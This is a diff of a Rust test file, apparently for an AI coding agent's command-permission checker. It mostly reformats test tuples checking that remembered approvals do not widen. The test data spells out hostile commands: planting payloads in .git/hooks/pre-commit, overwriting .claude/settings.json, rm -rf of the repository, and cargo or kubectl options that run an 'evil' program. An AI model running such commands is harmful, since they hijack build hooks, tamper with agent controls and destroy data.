@@ -61,7 +61,9 @@ fn widened(cases: &[(&[&str], &[&str])]) -> Vec<String> {
             "remembered rule {stored:?} no longer covers the approved {original:?}"
         );
         if covered(&rules, &spawn(later)) {
-            failures.push(format!("{original:?} stored {stored:?} which covers {later:?}"));
+            failures.push(format!(
+                "{original:?} stored {stored:?} which covers {later:?}"
+            ));
         }
     }
     failures
@@ -112,14 +114,23 @@ fn remembered_unlisted_interpreters_and_runners_keep_exact_argv() {
         (&["nodejs", "-e", "1"], &["nodejs", "-e", "2"]),
         (&["bash.exe", "-c", "1"], &["bash.exe", "-c", "2"]),
         (&["pwsh", "-c", "1"], &["pwsh", "-c", "2"]),
-        (&["powershell", "-Command", "1"], &["powershell", "-Command", "2"]),
+        (
+            &["powershell", "-Command", "1"],
+            &["powershell", "-Command", "2"],
+        ),
         (&["cmd", "/c", "dir"], &["cmd", "/c", "del"]),
         (&["tsx", "a.ts"], &["tsx", "-e", "unseen"]),
         (&["bunx", "a"], &["bunx", "b"]),
-        (&["uv", "run", "a.py"], &["uv", "run", "--with", "evil", "b.py"]),
+        (
+            &["uv", "run", "a.py"],
+            &["uv", "run", "--with", "evil", "b.py"],
+        ),
         (&["pipx", "run", "a"], &["pipx", "run", "b"]),
         (&["caffeinate", "ls"], &["caffeinate", "sh", "-c", "unseen"]),
-        (&["arch", "-arm64", "ls"], &["arch", "-arm64", "sh", "-c", "unseen"]),
+        (
+            &["arch", "-arm64", "ls"],
+            &["arch", "-arm64", "sh", "-c", "unseen"],
+        ),
     ]);
 }
 
@@ -155,7 +166,13 @@ fn remembered_tool_config_queries_cannot_authorize_config_writes() {
         ),
         (
             &["kubectl", "config", "view"],
-            &["kubectl", "config", "set-credentials", "u", "--exec-command=/workspace/evil"],
+            &[
+                "kubectl",
+                "config",
+                "set-credentials",
+                "u",
+                "--exec-command=/workspace/evil",
+            ],
         ),
     ]);
 }
@@ -168,7 +185,10 @@ fn remembered_tool_config_queries_cannot_authorize_config_writes() {
 #[test]
 fn remembered_unseen_code_subcommands_outside_the_exact_list_keep_exact_argv() {
     assert_none_widened(&[
-        (&["yarn", "exec", "ls"], &["yarn", "exec", "sh", "-c", "unseen"]),
+        (
+            &["yarn", "exec", "ls"],
+            &["yarn", "exec", "sh", "-c", "unseen"],
+        ),
         (&["npm", "init", "foo"], &["npm", "init", "bar"]),
         (&["npm", "create", "foo"], &["npm", "create", "bar"]),
         (
@@ -204,11 +224,21 @@ fn remembered_build_prefixes_cannot_cover_options_that_name_a_program() {
         ),
         (
             &["cargo", "test"],
-            &["cargo", "test", "--config", "target.x.runner=\"/workspace/evil\""],
+            &[
+                "cargo",
+                "test",
+                "--config",
+                "target.x.runner=\"/workspace/evil\"",
+            ],
         ),
         (
             &["cargo", "build"],
-            &["cargo", "build", "--config", "build.rustc-wrapper=\"/workspace/evil\""],
+            &[
+                "cargo",
+                "build",
+                "--config",
+                "build.rustc-wrapper=\"/workspace/evil\"",
+            ],
         ),
         (
             &["npm", "run", "build"],
@@ -227,16 +257,33 @@ fn remembered_file_writing_programs_cannot_reach_control_paths() {
             &["cp", "a", "b"],
             &["cp", "payload", "/workspace/.git/hooks/pre-commit"],
         ),
-        (&["mv", "a", "b"], &["mv", "payload", ".git/hooks/pre-commit"]),
-        (&["ln", "-s", "a", "b"], &["ln", "-sf", "payload", ".git/hooks/pre-commit"]),
+        (
+            &["mv", "a", "b"],
+            &["mv", "payload", ".git/hooks/pre-commit"],
+        ),
+        (
+            &["ln", "-s", "a", "b"],
+            &["ln", "-sf", "payload", ".git/hooks/pre-commit"],
+        ),
         (&["tee", "a"], &["tee", ".claude/settings.json"]),
         (&["touch", "a"], &["touch", ".ego/config.toml"]),
-        (&["install", "a", "b"], &["install", "payload", ".git/hooks/pre-commit"]),
+        (
+            &["install", "a", "b"],
+            &["install", "payload", ".git/hooks/pre-commit"],
+        ),
         (&["rm", "a"], &["rm", "-rf", "/workspace/.git"]),
-        (&["chmod", "600", "a"], &["chmod", "755", ".git/hooks/pre-commit"]),
+        (
+            &["chmod", "600", "a"],
+            &["chmod", "755", ".git/hooks/pre-commit"],
+        ),
         (
             &["curl", "-o", "a", "https://example.test/a"],
-            &["curl", "-o", ".git/hooks/pre-commit", "https://example.test/a"],
+            &[
+                "curl",
+                "-o",
+                ".git/hooks/pre-commit",
+                "https://example.test/a",
+            ],
         ),
     ]);
 }
@@ -254,11 +301,31 @@ fn policy_exec_allow_never_covers_control_path_operands_or_cwd() {
                 WORKSPACE,
                 &["cp", "payload", "/workspace/.git/hooks/pre-commit"][..],
             ),
-            ("exec(cp *)", WORKSPACE, &["cp", "payload", ".git/hooks/x"][..]),
-            ("exec(tee *)", WORKSPACE, &["tee", ".Claude/settings.json"][..]),
-            ("exec(touch *)", WORKSPACE, &["touch", "vendor/x/.ego/y"][..]),
-            ("exec(tee *)", "/workspace/.git/hooks", &["tee", "pre-commit"][..]),
-            ("exec(touch *)", "/workspace/.claude", &["touch", "settings.json"][..]),
+            (
+                "exec(cp *)",
+                WORKSPACE,
+                &["cp", "payload", ".git/hooks/x"][..],
+            ),
+            (
+                "exec(tee *)",
+                WORKSPACE,
+                &["tee", ".Claude/settings.json"][..],
+            ),
+            (
+                "exec(touch *)",
+                WORKSPACE,
+                &["touch", "vendor/x/.ego/y"][..],
+            ),
+            (
+                "exec(tee *)",
+                "/workspace/.git/hooks",
+                &["tee", "pre-commit"][..],
+            ),
+            (
+                "exec(touch *)",
+                "/workspace/.claude",
+                &["touch", "settings.json"][..],
+            ),
         ] {
             let mut rules = Ruleset::default();
             Ruleset::merge(&mut rules.allow, Rule::load(rule).unwrap(), source);
@@ -279,6 +346,9 @@ fn remembered_git_near_spellings_of_the_allowlist_keep_exact_argv() {
         (&["git", "ls-tree.x", "HEAD"], &["git", "ls-tree.x", "--x"]),
         (&["git", "ls_tree", "HEAD"], &["git", "ls_tree", "--x"]),
         (&["git", "ls-tree+", "HEAD"], &["git", "ls-tree+", "--x"]),
-        (&["git.exe", "log"], &["git.exe", "config", "core.hooksPath", "x"]),
+        (
+            &["git.exe", "log"],
+            &["git.exe", "config", "core.hooksPath", "x"],
+        ),
     ]);
 }
